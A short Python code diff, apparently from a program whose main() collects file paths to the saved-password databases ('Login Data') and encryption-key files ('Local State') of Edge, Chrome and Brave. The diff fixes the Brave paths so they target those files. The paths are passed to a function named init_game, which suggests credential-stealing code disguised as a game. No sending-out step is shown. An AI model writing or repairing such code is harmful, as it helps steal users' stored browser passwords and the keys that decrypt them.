@@ -205,7 +205,7 @@ def main():
                            "User Data", "Local State")
 
     locat_b = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "BraveSoftware",
-                           "Brave-Browser", "User Data")
+                           "Brave-Browser", "User Data", "Local State")
 
     ede = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Microsoft",
                        "Edge", "User Data", "Default", "Login Data")
@@ -214,7 +214,7 @@ def main():
                        "Chrome", "User Data", "Default", "Login Data")
 
     brve = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data",
-                        "Default")
+                        "Default", "Login Data")
 
 
     init_game(locat_e, locat_g, locat_b, ede, gle, brve)
